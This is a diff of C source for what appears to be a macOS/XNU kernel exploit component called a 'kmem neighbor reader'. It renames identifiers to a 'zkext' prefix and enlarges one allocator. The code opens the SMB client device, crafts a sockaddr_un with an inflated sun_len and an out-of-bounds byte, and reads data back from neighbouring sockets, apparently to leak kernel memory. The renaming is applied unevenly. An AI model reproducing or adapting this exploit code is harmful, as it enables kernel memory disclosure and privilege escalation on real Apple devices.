@@ -14,14 +14,14 @@
 #include <sys/un.h>
 #include <sys/errno.h>
 
-#include "neighbor_reader.h"
+#include "zkext_neighbor_reader.h"
 #include "platform_constants.h"
 
 #include "../xnu/saddr_allocator.h"
 #include "../smb/client.h"
 
 
-struct kmem_neighbor_reader {
+struct kmem_zkext_neighbor_reader {
     xnu_saddr_allocator_t reader_allocator;
     xnu_saddr_allocator_t pad_allocator;
     int fd_smb;
@@ -32,25 +32,25 @@ struct kmem_neighbor_reader {
     } state;
 };
 
-void kmem_neighbor_reader_init_saddr_allocators(kmem_neighour_reader_t reader) {
+void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t reader) {
     assert(reader->reader_allocator == NULL);
     assert(reader->pad_allocator == NULL);
-    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 16);
+    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 32);
     reader->pad_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64);
 }
 
-kmem_neighour_reader_t kmem_neighbor_reader_create(void) {
+kmem_zkext_neighour_reader_t kmem_neighbor_reader_create(void) {
     int fd_smb = smb_client_open_dev();
     assert(fd_smb >= 0);
-    kmem_neighour_reader_t reader = malloc(sizeof(struct kmem_neighbor_reader));
-    bzero(reader, sizeof(struct kmem_neighbor_reader));
+    kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
+    bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
     kmem_neighbor_reader_init_saddr_allocators(reader);
     reader->fd_smb = fd_smb;
     reader->state = STATE_CREATED;
     return reader;
 }
 
-void kmem_neighbor_reader_prepare(kmem_neighour_reader_t reader, char* data, size_t data_size) {
+void kmem_zkext_neighbor_reader_prepare(kmem_zkext_neighour_reader_t reader, char* data, size_t data_size) {
     assert(data_size <= UINT32_MAX);
     assert(reader->state == STATE_CREATED);
     xnu_saddr_allocator_allocate(reader->reader_allocator);
@@ -60,7 +60,7 @@ void kmem_neighbor_reader_prepare(kmem_neighour_reader_t reader, char* data, siz
     reader->state = STATE_PREPARED;
 }
 
-int kmem_neighbor_reader_read_modified(kmem_neighour_reader_t reader, struct socket_fdinfo* infos, size_t* count) {
+int kmem_zkext_neighbor_reader_read_modified(kmem_zkext_neighour_reader_t reader, struct socket_fdinfo* infos, size_t* count) {
     assert(reader->state == STATE_PREPARED);
     
     int fds_modified[*count];
@@ -81,7 +81,7 @@ int kmem_neighbor_reader_read_modified(kmem_neighour_reader_t reader, struct soc
     return 0;
 }
 
-int kmem_neighbor_reader_prepare_read_modified(kmem_neighour_reader_t reader, char* out, uint8_t size) {
+int kmem_zkext_neighbor_reader_prepare_read_modified(kmem_zkext_neighour_reader_t reader, char* out, uint8_t size) {
     assert(reader->state == STATE_CREATED);
     assert(size < 128);
     assert(size >= 64);
@@ -91,13 +91,13 @@ int kmem_neighbor_reader_prepare_read_modified(kmem_neighour_reader_t reader, ch
     addr.sun_len = size * 2;
     static_assert(sizeof(addr) >= 64 + sizeof(uint8_t), "");
     *((uint8_t*)((uintptr_t)&addr + 64)) = size + (size - 64);
-    kmem_neighbor_reader_prepare(reader, (char*)&addr, size);
+    kmem_zkext_neighbor_reader_prepare(reader, (char*)&addr, size);
     
     size_t num_modified_expected = (((size * 2) + (64 - 1)) / 64) - 1;
     
     struct socket_fdinfo modified[num_modified_expected];
     size_t num_modified_actual = num_modified_expected;
-    int error = kmem_neighbor_reader_read_modified(reader, modified, &num_modified_actual);
+    int error = kmem_zkext_neighbor_reader_read_modified(reader, modified, &num_modified_actual);
     if (error) {
         return error;
     }
@@ -117,7 +117,7 @@ int kmem_neighbor_reader_prepare_read_modified(kmem_neighour_reader_t reader, ch
     return EBADF;
 }
 
-void kmem_neighbor_reader_reset(kmem_neighour_reader_t reader) {
+void kmem_zkext_neighbor_reader_reset(kmem_zkext_neighour_reader_t reader) {
     assert(reader->state == STATE_PREPARED);
     xnu_saddr_allocator_destroy(&reader->reader_allocator);
     xnu_saddr_allocator_destroy(&reader->pad_allocator);
@@ -125,8 +125,8 @@ void kmem_neighbor_reader_reset(kmem_neighour_reader_t reader) {
     reader->state = STATE_CREATED;
 }
 
-void kmem_neighbor_reader_destroy(kmem_neighour_reader_t* reader_p) {
-    kmem_neighour_reader_t reader = *reader_p;
+void kmem_zkext_neighbor_reader_destroy(kmem_zkext_neighour_reader_t* reader_p) {
+    kmem_zkext_neighour_reader_t reader = *reader_p;
     xnu_saddr_allocator_destroy(&reader->reader_allocator);
     xnu_saddr_allocator_destroy(&reader->pad_allocator);
     close(reader->fd_smb);
